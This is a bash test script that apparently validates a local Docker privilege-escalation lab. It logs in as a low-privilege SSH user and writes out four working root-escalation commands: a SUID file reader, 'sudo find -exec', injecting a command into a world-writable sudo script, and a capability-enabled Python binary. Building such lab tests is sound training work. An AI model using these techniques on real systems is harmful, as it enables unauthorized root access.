#!/usr/bin/env bash
set -e
DC=$(docker compose version &>/dev/null && echo "docker compose" || echo "docker-compose")

$DC down 2>/dev/null || true
$DC up --build -d
trap "$DC down" EXIT

echo "[*] Waiting for sshd on port 2222..."
for i in $(seq 1 30); do
  nc -z -w2 127.0.0.1 2222 2>/dev/null && break
  sleep 2
  if [ "$i" -eq 30 ]; then
    echo "[FAIL] sshd did not come up"
    $DC logs; exit 1
  fi
done
sleep 1

FAIL=0
SSH_OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o PreferredAuthentications=password -p 2222"

run_ssh() {
  SSHPASS="lowpriv123" sshpass -e ssh $SSH_OPTS lowpriv@127.0.0.1 "$1" 2>&1 || true
}

# --- Test 1: SUID readfile ---
echo ""
echo "[*] Test 1 — SUID readfile: read /root/flag1.txt as lowpriv"
OUT=$(run_ssh "/usr/local/bin/readfile /root/flag1.txt")
if echo "$OUT" | grep -qE 'POC\{[0-9a-f]{32}\}'; then
  echo "[PASS] SUID: flag1 = $(echo "$OUT" | grep -oE 'POC\{[0-9a-f]{32}\}')"
else
  echo "[FAIL] SUID: $OUT"; FAIL=1
fi

# --- Test 2: sudo find ---
echo ""
echo "[*] Test 2 — sudo find: execute cat as root via find -exec"
OUT=$(run_ssh "sudo find /root/flag2.txt -exec cat {} \\;")
if echo "$OUT" | grep -qE 'POC\{[0-9a-f]{32}\}'; then
  echo "[PASS] sudo find: flag2 = $(echo "$OUT" | grep -oE 'POC\{[0-9a-f]{32}\}')"
else
  echo "[FAIL] sudo find: $OUT"; FAIL=1
fi

# --- Test 3: world-writable sudo script ---
echo ""
echo "[*] Test 3 — writable sudo script: inject command into /opt/backup.sh"
OUT=$(run_ssh "echo 'cat /root/flag3.txt' > /opt/backup.sh && sudo /opt/backup.sh")
if echo "$OUT" | grep -qE 'POC\{[0-9a-f]{32}\}'; then
  echo "[PASS] writable script: flag3 = $(echo "$OUT" | grep -oE 'POC\{[0-9a-f]{32}\}')"
else
  echo "[FAIL] writable script: $OUT"; FAIL=1
fi

# --- Test 4: capabilities ---
echo ""
echo "[*] Test 4 — cap_dac_read_search on py3: read /root/flag4.txt as lowpriv"
OUT=$(run_ssh "/usr/local/bin/py3 -c \"print(open('/root/flag4.txt').read(), end='')\"")
if echo "$OUT" | grep -qE 'POC\{[0-9a-f]{32}\}'; then
  echo "[PASS] capabilities: flag4 = $(echo "$OUT" | grep -oE 'POC\{[0-9a-f]{32}\}')"
else
  echo "[FAIL] capabilities: $OUT"; FAIL=1
fi

# --- Confirm lowpriv cannot read flags directly ---
echo ""
echo "[*] Test 5 — direct read returns permission denied"
OUT=$(run_ssh "cat /root/flag1.txt 2>&1 || true")
if echo "$OUT" | grep -qi 'permission denied\|cannot open'; then
  echo "[PASS] direct read correctly denied"
else
  echo "[FAIL] expected permission denied, got: $OUT"; FAIL=1
fi

echo ""
if [ "$FAIL" -eq 0 ]; then
  echo "[PASS] All tests passed"
  exit 0
else
  echo "[FAIL] One or more tests failed"
  exit 1
fi
